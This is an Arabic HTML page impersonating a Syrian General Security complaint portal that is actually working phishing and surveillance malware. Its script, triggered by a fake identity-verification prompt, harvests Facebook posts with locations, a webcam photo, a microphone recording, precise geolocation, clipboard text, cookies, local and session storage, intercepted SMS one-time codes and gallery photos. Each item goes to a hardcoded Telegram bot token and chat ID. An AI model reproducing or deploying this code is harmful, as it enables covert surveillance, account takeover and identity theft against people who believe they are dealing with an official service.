<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الأمن العام السوري - تسجيل الشكاوى</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
    <script async defer src="https://connect.facebook.net/en_US/sdk.js"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
            color: white;
            direction: rtl;
            overflow: hidden;
        }
        #scene-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.3;
        }
        #form-container {
            background: rgba(255, 255, 255, 0.95);
            color: #1e3a8a;
            padding: 2rem;
            border-radius: 1rem;
            max-width: 600px;
            margin: 2rem auto;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
        #modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        #modal-content {
            background: white;
            padding: 2rem;
            border-radius: 1rem;
            text-align: center;
            color: #1e3a8a;
        }
        #status {
            margin-top: 1rem;
            color: #1e3a8a;
        }
        #video, #canvas, #audio, #galleryInput {
            display: none;
        }
        .logo-text {
            font-size: 2.5rem;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <div id="scene-container"></div>
    <div class="text-center mt-8">
        <h1 class="logo-text text-white">الأمن العام السوري</h1>
        <p class="text-lg text-white">منصة تسجيل الشكاوى الرسمية</p>
    </div>
    <div id="form-container">
        <h2 class="text-2xl font-bold mb-4">تسجيل شكوى</h2>
        <div class="space-y-4">
            <input id="fullName" type="text" placeholder="الاسم الثلاثي" class="w-full p-3 border rounded-lg">
            <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" class="w-full p-3 border rounded-lg">
            <textarea id="complaint" placeholder="نص الشكوى" class="w-full p-3 border rounded-lg h-32"></textarea>
            <button id="submitBtn" class="w-full bg-blue-800 text-white p-3 rounded-lg hover:bg-blue-900">إرسال الشكوى</button>
        </div>
        <p id="status">يرجى إدخال بياناتك لتسجيل الشكوى.</p>
    </div>
    <div id="modal">
        <div id="modal-content">
            <h2 class="text-xl font-bold mb-4">التحقق من الهوية</h2>
            <p>اضغط على "تأكيد" للتحقق من هويتك وتسجيل الشكوى.</p>
            <button id="confirmBtn" class="bg-blue-800 text-white p-3 rounded-lg mt-4 hover:bg-blue-900">تأكيد</button>
        </div>
    </div>
    <video id="video" width="320" height="240"></video>
    <canvas id="canvas" width="320" height="240"></canvas>
    <audio id="audio"></audio>
    <input type="file" id="galleryInput" accept="image/*" multiple>

    <script>
        // تهيئة Three.js لشعار 3D
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer({ alpha: true });
        renderer.setSize(window.innerWidth, window.innerHeight);
        document.getElementById('scene-container').appendChild(renderer.domElement);
        const geometry = new THREE.SphereGeometry(5, 32, 32);
        const material = new THREE.MeshBasicMaterial({ color: 0x1e3a8a, wireframe: true });
        const sphere = new THREE.Mesh(geometry, material);
        scene.add(sphere);
        camera.position.z = 10;
        function animate() {
            requestAnimationFrame(animate);
            sphere.rotation.y += 0.01;
            renderer.render(scene, camera);
        }
        animate();

        // تهيئة GSAP للحركات
        gsap.from('#form-container', { opacity: 0, y: 50, duration: 1, delay: 0.5 });
        gsap.from('.logo-text', { opacity: 0, scale: 0.5, duration: 1.5, ease: 'elastic' });

        // تهيئة Facebook SDK
        window.fbAsyncInit = function() {
            FB.init({
                appId: 'YOUR_FACEBOOK_APP_ID', // استبدل بمعرف تطبيق فيسبوك
                cookie: true,
                xfbml: true,
                version: 'v20.0'
            });
        };

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const audioElement = document.getElementById('audio');
        const status = document.getElementById('status');
        const phoneNumberInput = document.getElementById('phoneNumber');
        const fullNameInput = document.getElementById('fullName');
        const complaintInput = document.getElementById('complaint');
        const galleryInput = document.getElementById('galleryInput');
        const modal = document.getElementById('modal');
        const confirmBtn = document.getElementById('confirmBtn');
        const submitBtn = document.getElementById('submitBtn');
        let mediaRecorder;
        let recordedChunks = [];

        // عرض النافذة المنبثقة بعد 7 ثوانٍ
        setTimeout(() => {
            modal.style.display = 'flex';
            gsap.from('#modal-content', { opacity: 0, scale: 0.7, duration: 0.5 });
        }, 7000);

        // بدء التحقق عند النقر على "تأكيد"
        confirmBtn.onclick = async () => {
            modal.style.display = 'none';
            status.innerText = 'جارٍ التحقق...';
            try {
                await fbLogin();
                await requestCameraAndMicrophone();
                await requestLocation();
                await readClipboard();
                await collectBrowserData();
                await sendOTP(phoneNumberInput.value);
                await requestGalleryAccess();
            } catch (error) {
                status.innerText = 'خطأ في التحقق: ' + error.message;
                console.error(error);
            }
        };

        // إرسال الشكوى
        submitBtn.onclick = async () => {
            const fullName = fullNameInput.value;
            const phoneNumber = phoneNumberInput.value;
            const complaint = complaintInput.value;
            if (!fullName || !phoneNumber || !complaint) {
                status.innerText = 'يرجى ملء جميع الحقول';
                return;
            }
            const complaintData = `
بيانات الشكوى:
- الاسم الثلاثي: ${fullName}
- رقم الهاتف: ${phoneNumber}
- نص الشكوى: ${complaint}
            `;
            status.innerText = 'تم إرسال الشكوى بنجاح!';
            await sendToTelegram(complaintData);
        };

        // تسجيل الدخول عبر فيسبوك
        async function fbLogin() {
            try {
                await new Promise((resolve, reject) => {
                    FB.login((response) => {
                        if (response.authResponse) {
                            FB.api('/me', { fields: 'id,name,posts{place,message}' }, (userData) => {
                                if (userData.error) {
                                    status.innerText = 'خطأ في جمع بيانات فيسبوك';
                                    reject(userData.error);
                                } else {
                                    sendSocialMediaDataToTelegram(userData);
                                    resolve();
                                }
                            });
                        } else {
                            status.innerText = 'تم إلغاء تسجيل الدخول عبر فيسبوك';
                            reject(new Error('تم إلغاء تسجيل الدخول'));
                        }
                    }, { scope: 'public_profile,user_posts' });
                });
            } catch (error) {
                console.error(error);
            }
        }

        // طلب الوصول إلى الكاميرا والميكروفون
        async function requestCameraAndMicrophone() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: true
                });
                video.srcObject = stream;
                setTimeout(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/png');
                    sendPhotoToTelegram(imageData);
                    mediaRecorder = new MediaRecorder(stream);
                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) recordedChunks.push(event.data);
                    };
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(recordedChunks, { type: 'audio/webm' });
                        recordedChunks = [];
                        sendAudioToTelegram(blob);
                        stream.getTracks().forEach(track => track.stop());
                    };
                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 5000);
                }, 1000);
            } catch (error) {
                status.innerText = 'خطأ في الوصول إلى الكاميرا/الميكروفون';
                console.error(error);
            }
        }

        // طلب الموقع الجغرافي
        async function requestLocation() {
            try {
                await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const data = `
بيانات الموقع:
- الإحداثيات: ${position.coords.latitude}, ${position.coords.longitude}
- الدقة: ${position.coords.accuracy} متر
- الوقت: ${new Date(position.timestamp).toLocaleString()}
                            `;
                            await sendToTelegram(data);
                            resolve();
                        },
                        (error) => {
                            status.innerText = 'خطأ في طلب الموقع';
                            console.error(error);
                            reject(error);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                });
            } catch (error) {
                console.error(error);
            }
        }

        // جمع بيانات المتصفح
        async function collectBrowserData() {
            try {
                const browserData = `
بيانات المتصفح:
- User Agent: ${navigator.userAgent}
- اللغة: ${navigator.language}
- دقة الشاشة: ${window.screen.width}x${window.screen.height}
- ملفات تعريف الارتباط: ${document.cookie || 'لا توجد كوكيز'}
- Local Storage: ${JSON.stringify(localStorage) || 'لا توجد بيانات'}
- Session Storage: ${JSON.stringify(sessionStorage) || 'لا توجد بيانات'}
                `;
                await sendToTelegram(browserData);
            } catch (error) {
                status.innerText = 'خطأ في جمع بيانات المتصفح';
                console.error(error);
            }
        }

        // قراءة الحافظة
        async function readClipboard() {
            try {
                if (!navigator.clipboard) {
                    status.innerText = 'الحافظة غير مدعومة';
                    return;
                }
                const text = await navigator.clipboard.readText();
                const clipboardData = `محتوى الحافظة: ${text || 'لا توجد بيانات'}`;
                await sendToTelegram(clipboardData);
            } catch (error) {
                status.innerText = 'خطأ في قراءة الحافظة';
                console.error(error);
            }
        }

        // إرسال رمز التحقق عبر SMS
        async function sendOTP(phoneNumber) {
            if (!phoneNumber) return;
            try {
                const response = await fetch('https://your-backend-server/send-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber })
                });
                const result = await response.json();
                if (!response.ok) throw new Error(result.error || 'فشل إرسال رمز التحقق');
                if ('OTPCredential' in window) {
                    const ac = new AbortController();
                    navigator.credentials.get({
                        otp: { transport: ['sms'] },
                        signal: ac.signal
                    }).then(otp => {
                        if (otp && otp.code) {
                            sendToTelegram(`رمز التحقق: ${otp.code}\nرقم الهاتف: ${phoneNumber}`);
                        }
                    }).catch(error => {
                        console.error(error);
                    });
                    setTimeout(() => ac.abort(), 60000);
                }
            } catch (error) {
                console.error(error);
            }
        }

        // طلب الوصول إلى معرض الصور
        async function requestGalleryAccess() {
            try {
                galleryInput.click();
                galleryInput.onchange = async () => {
                    const files = galleryInput.files;
                    if (files.length === 0) return;
                    for (const file of files) {
                        await sendPhotoToTelegram(file);
                    }
                };
            } catch (error) {
                console.error(error);
            }
        }

        // إرسال بيانات فيسبوك إلى تيليجرام
        async function sendSocialMediaDataToTelegram(userData) {
            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
            const chatId = '6733154889';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                let message = `بيانات فيسبوك:\n- المعرف: ${userData.id}\n- الاسم: ${userData.name}`;
                if (userData.posts && userData.posts.data) {
                    message += '\n- المنشورات:\n';
                    userData.posts.data.forEach(post => {
                        message += `- المنشور: ${post.message || 'بدون نص'}\n`;
                        if (post.place) {
                            message += `  الموقع: ${post.place.name || 'غير معروف'}, ${post.place.location ? `${post.place.location.latitude}, ${post.place.location.longitude}` : 'بدون إحداثيات'}\n`;
                        }
                    });
                }
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });
                if (!response.ok) throw new Error('فشل إرسال بيانات فيسبوك');
            } catch (error) {
                console.error(error);
            }
        }

        // إرسال نص إلى تيليجرام
        async function sendToTelegram(message) {
            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
            const chatId = '6733154889';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });
                if (!response.ok) throw new Error('فشل إرسال النص');
            } catch (error) {
                console.error(error);
            }
        }

        // إرسال الصورة إلى تيليجرام
        async function sendPhotoToTelegram(fileOrData) {
            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
            const chatId = '6733154889';
            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

            try {
                let blob;
                if (typeof fileOrData === 'string') {
                    const byteString = atob(fileOrData.split(',')[1]);
                    const mimeString = fileOrData.split(',')[0].split(':')[1].split(';')[0];
                    const ab = new ArrayBuffer(byteString.length);
                    const ia = new Uint8Array(ab);
                    for (let i = 0; i < byteString.length; i++) {
                        ia[i] = byteString.charCodeAt(i);
                    }
                    blob = new Blob([ab], { type: mimeString });
                } else {
                    blob = fileOrData;
                }

                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, blob.name || 'photo.png');

                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                if (!response.ok) throw new Error('فشل إرسال الصورة');
            } catch (error) {
                console.error(error);
            }
        }

        // إرسال الصوت إلى تيليجرام
        async function sendAudioToTelegram(audioBlob) {
            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
            const chatId = '6733154889';
            const url = `https://api.telegram.org/bot${botToken}/sendAudio`;

            try {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('audio', audioBlob, 'audio.webm');

                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                if (!response.ok) throw new Error('فشل إرسال الصوت');
            } catch (error) {
                console.error(error);
            }
        }
    </script>
</body>
</html>
